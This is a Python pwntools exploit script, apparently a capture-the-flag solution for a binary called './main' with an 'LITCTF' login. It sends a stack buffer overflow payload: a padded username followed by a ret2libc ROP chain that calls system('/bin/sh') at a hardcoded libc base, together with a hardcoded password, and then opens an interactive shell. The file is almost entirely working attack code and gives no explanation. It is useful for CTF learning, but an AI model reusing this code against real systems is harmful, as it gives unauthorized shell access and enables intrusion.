#!/usr/bin/env python3
from pwn import *
import sys

# GLOBAL VARIABLES
binary = None
elf = None
libc = None
rop = None
script = None
REMOTE = []

io = None
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
rr = lambda *a, **k: io.recvregex(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
st = lambda *a, **k: io.sendthen(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
slt = lambda *a, **k: io.sendlinethen(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)

def start(*args, **kwargs):
    global elf, rop, libc
    elf = context.binary = ELF(binary, False)
    context.terminal = ["terminator", "-x", "bash", "-c"]
    #context.log_level  = 'debug'
    libc = elf.libc
    rop = ROP(elf)

    usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
    # [ip, port]
    if args:
        arguments = [elf.path]
        arguments.extend(args)
        return process(arguments)

    if not args and not kwargs:
        if len(sys.argv) > 1:
            if sys.argv[1] == 'gdb':
                return gdb.debug(elf.path, gdbscript=script)
            elif sys.argv[1] == 'remote':
                return remote(REMOTE[0], REMOTE[1])
            else:
                print("INVALID ARGUMENT")
                print(usage)
                sys.exit(0)
        else:
            return process(elf.path)

def main():
    global io, script, binary, REMOTE, libc
    #################### 
    ### EXPLOIT CODE ###
    ####################
    # set binary name
    binary = "./main"
    #remote address
    REMOTE = []
    # set gdb script
    script = """
    continue
    """
    # start process | remote process
    io = start()

    libc.address = 0x00007ffff7dc4000
    sh = next(libc.search(b"/bin/sh"))
    system = libc.sym['system']
    pop_rdi = 0x0000000000401323
    ret = 0x000000000040101a
    offset = 0x20 + 8

    username = 'LITCTF'
    password = b'd0nt_57r1ngs_m3_3b775884'
    
    payload = flat(
        username,
        "\x00",
        cyclic((offset - len(username) - 1)),
        ret,
        pop_rdi,
        sh,
        system
    )

    #sla("Enter username:\n", username)
    sla("Enter username:\n", payload)
    sla("Enter password:\n", password)
    ia()




if __name__ == "__main__":
    main()

